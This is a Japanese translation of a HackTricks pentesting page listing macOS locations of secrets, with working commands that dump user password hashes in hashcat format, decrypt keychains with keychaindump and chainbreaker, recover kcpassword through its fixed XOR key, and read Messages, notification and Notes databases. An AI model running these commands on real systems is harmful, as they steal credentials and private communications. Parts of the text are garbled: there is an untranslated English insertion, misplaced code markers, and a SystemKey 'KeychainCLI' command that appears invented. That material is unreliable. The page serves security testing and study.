# macOSの機密情報の場所

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## パスワード

### シャドウパスワード

シャドウパスワードは、ユーザーの設定と共に**`/var/db/dslocal/nodes/Default/users/`**にあるplistに格納されています。\
次のワンライナーを使用して、**ユーザーに関するすべての情報**（ハッシュ情報を含む）をダンプすることができます：

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**このようなスクリプト**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2)や[**このようなスクリプト**](https://github.com/octomagon/davegrohl.git)を使用して、ハッシュを**hashcatの形式**に変換することができます。

macOS PBKDF2-SHA512の**-m 7100**形式で、すべての非サービスアカウントの資格情報をダンプする代替のワンライナーは次のとおりです：

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### キーチェーンのダンプ

securityバイナリを使用してパスワードを復号化してダンプする場合、ユーザーにこの操作を許可するように求めるプロンプトがいくつか表示されることに注意してください。
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
[このコメント](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)に基づくと、これらのツールはBig Surではもう動作しないようです。
{% endhint %}

攻撃者は、**keychaindump**を実行するためにシステムへのアクセス権限を取得し、**root**権限にエスカレーションする必要があります。このアプローチには独自の条件があります。前述のように、**ログイン時にはデフォルトでキーチェーンがアンロックされ、システムを使用している間はアンロックされたまま**です。これは利便性のためであり、アプリケーションがキーチェーンにアクセスするたびにパスワードを入力する必要がないためです。ユーザーがこの設定を変更し、使用ごとにキーチェーンをロックするように選択した場合、keychaindumpはもはや機能しません。keychaindumpはアンロックされたキーチェーンに依存しています。

Keychaindumpがメモリからパスワードを抽出する方法を理解することは重要です。このトランザクションで最も重要なプロセスは「**securityd**」プロセスです。Appleはこのプロセスを**認証および暗号操作のセキュリティコンテキストデーモン**と呼んでいます。Appleの開発者ライブラリはそれについてあまり詳しく説明していませんが、securitydがキーチェーンへのアクセスを処理していることを教えてくれます。Juusoの研究では、キーチェーンを復号化するために必要な鍵を「**マスターキー**」と呼んでいます。このマスターキーはユーザーのOS Xログインパスワードから派生しているため、このキーチェーンファイルを読み取るためにはこのマスターキーが必要です。次の手順でマスターキーを取得できます。**securitydのヒープをスキャンします（keychaindumpはvmmapコマンドを使用してこれを行います）**。可能なマスターキーはMALLOC\_TINYとしてフラグが立てられた領域に格納されています。次のコマンドでこれらのヒープの場所を自分で確認できます。
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
**Keychaindump**は、返されたヒープを0x0000000000000018の出現箇所を検索します。次の8バイトの値が現在のヒープを指している場合、潜在的なマスターキーが見つかります。ここから、ソースコードで確認できるように、少しの復号化が必要ですが、分析者として最も重要な点は、この情報を復号化するために必要なデータがsecuritydのプロセスメモリに格納されていることです。以下は、keychain dumpの出力の例です。
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker)は、OSXキーチェーンから次の種類の情報を法的に安全な方法で抽出するために使用できます：

* ハッシュ化されたキーチェーンのパスワード（[hashcat](https://hashcat.net/hashcat/)や[John the Ripper](https://www.openwall.com/john/)でクラック可能）
* インターネットパスワード
* 一般的なパスワード
* プライベートキー
* 公開鍵
* X509証明書
* セキュアノート
* Appleshareパスワード

キーチェーンのアンロックパスワード、[volafox](https://github.com/n0fate/volafox)や[volatility](https://github.com/volatilityfoundation/volatility)で取得したマスターキー、またはSystemKeyなどのアンロックファイルがあれば、Chainbreakerは平文のパスワードも提供します。

キーチェーンをアンロックするためのこれらの方法がない場合、Chainbreakerは他の利用可能な情報を表示します。

### **キーチェーンのキーをダンプする**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
### **SystemKeyを使用してキーチェーンのキー（パスワード付き）をダンプする**

SystemKeyを使用すると、MacOSのキーチェーンに保存されているキー（パスワードを含む）をダンプすることができます。

```bash
/System/Library/Security/SecurityAgentPlugins/SystemKeychain.bundle/Contents/Resources/KeychainCLI -k /Library/Keychains/System.keychain -d
```

このコマンドを実行すると、`/Library/Keychains/System.keychain`に保存されているキーチェーンのキーがダンプされます。
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **ハッシュをクラックしてキーチェーンのキー（パスワード付き）をダンプする**

To dump keychain keys with passwords, you can crack the hash. Here's how you can do it:

1. Obtain the hash of the keychain password. This can be done by extracting the keychain file from the target macOS system.

2. Use a password cracking tool, such as John the Ripper or Hashcat, to crack the hash. These tools utilize various techniques, such as dictionary attacks or brute-force attacks, to guess the password.

3. Once the password is cracked, you can use it to decrypt the keychain file and extract the keys along with their associated passwords.

Keep in mind that cracking a hash can be a time-consuming process, especially if the password is complex. Additionally, it is important to note that unauthorized access to someone else's keychain is illegal and unethical. This technique should only be used for legitimate purposes, such as during a penetration test or with proper authorization.
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **メモリダンプを使用してキーチェーンのキー（パスワード付き）をダンプする**

キーチェーンのキー（パスワード付き）をダンプするために、[以下の手順](..#dumping-memory-with-osxpmem)に従ってください。
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **ユーザーのパスワードを使用してキーチェーンのキー（パスワード付き）をダンプする**

ユーザーのパスワードを知っている場合、それを使用してユーザーに属するキーチェーンをダンプして復号化することができます。
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

**kcpassword**ファイルは、システムの所有者が**自動ログインを有効に**している場合にのみ、**ユーザーのログインパスワード**を保持するファイルです。したがって、ユーザーはパスワードを求められることなく自動的にログインされます（これはあまり安全ではありません）。

パスワードは、ファイル**`/etc/kcpassword`**に**`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**というキーでXORされて格納されます。ユーザーのパスワードがキーよりも長い場合、キーは再利用されます。\
これにより、パスワードは非常に簡単に回復できます。たとえば、[**このようなスクリプト**](https://gist.github.com/opshope/32f65875d45215c3677d)を使用することができます。

## データベース内の興味深い情報

### メッセージ
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### 通知

通知データは`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`にあります。

興味深い情報のほとんどは**blob**に含まれています。そのため、そのコンテンツを**抽出**して**人間が読める形式**に変換するか、**`strings`**を使用する必要があります。アクセスするには、次のようにします：

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### ノート

ユーザーの**ノート**は`~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`に保存されています。

{% endcode %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝したいですか？** または、**PEASSの最新バージョンにアクセスしたいですか？** または、**HackTricksをPDFでダウンロードしたいですか？** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
